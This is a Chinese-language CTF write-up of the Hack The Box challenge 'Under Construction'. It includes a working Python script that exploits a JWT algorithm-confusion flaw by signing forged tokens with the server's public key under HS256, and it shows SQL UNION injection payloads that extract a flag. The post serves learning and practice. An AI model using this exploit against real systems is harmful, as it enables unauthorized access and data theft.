---
title: "Hack the Box——Under Construction"
date: 2020-09-12T02:28:26+08:00
showDate: true
draft: false
tags: ["security","hack the box", "ctf"]
categories: ["security"]
---


# under construction

## 0x00

因为freelancer那题一天就过了，做题的劲又起来了，乘着明天（应该是今天）周末不上班，熬夜做题吧~

## 0x01

上来是一个登录界面，很简陋，怪不得是under construction

![1.png](1.png)

看看登录注册，抓包看看都有什么。除了session特别长之外，好像没什么特别的。

![2.png](2.png)

看一眼这个session，太眼熟了，这不就是jwt嘛。

丢到jwtio看看

![3.png](3.png)

payload里面又username，还有个公钥。搜了下jwt的RS256，其实就是非对称加密，私钥签名，公钥验签。

顺带还搜到了相关的漏洞。就是可以通过改头部的算法的方式，将`RSA加密算法修改为HMAC`，这样的结果就是服务端会直接使用HS256，并且把传过去的公钥（RSA的公钥）看作是当前算法（HMAC）的密钥来进行验签。

## 0x02

那简单了，直接写代码就好了注入就好了（尝试了sqlmap的tamper能注入但是sqlmap好像不能识别，所以只能手测了。）

```
# coding: utf-8
import jwt
import requests


def gen_token(username):
    payload = {"username": username,
               "pk": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY\nktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi\nXuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg\njIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH\n+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx\nV8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr\n0wIDAQAB\n-----END PUBLIC KEY-----\n",
               "iat": 1599843758}
    public = payload.get("pk")
    return jwt.encode(payload, key=public, algorithm="HS256").decode()


def req_host(token):
    url = "http://docker.hackthebox.eu:30513/"
    headers = {
        "cookie": "session=" + token
    }
    r = requests.get(url, headers=headers)
    print(r.text)


def injection(payload):
    token = gen_token(payload)
    req_host(token)


if __name__ == '__main__':
    p = "root' UNION SELECT NULL,NULL,database()--"
    injection(p)
```

## 0x03

最后一顿手测拿到flag

```
if __name__ == '__main__':
    p = "roots' UNION SELECT top_secret_flaag,top_secret_flaag,top_secret_flaag from flag_storage--"
    injection(p)
```

![4](4.png)

## 0x04 

虽然题目有点简单，但是解锁新姿势，jwt加密算法替换

## 0x05 参考资料

[SQLite手工注入方法小结](https://www.cnblogs.com/xiaozi/p/5760321.html)

[攻击JWT的一些方法](https://xz.aliyun.com/t/6776)

[2018CUMTCTF-Final-Web](https://skysec.top/2018/05/19/2018CUMTCTF-Final-Web/#Pastebin/)

[Hacking JWT(JSON Web Token)](https://www.cnblogs.com/dliv3/p/7450057.html#2-%E4%BF%AE%E6%94%B9%E7%AE%97%E6%B3%95%E4%B8%BAnone)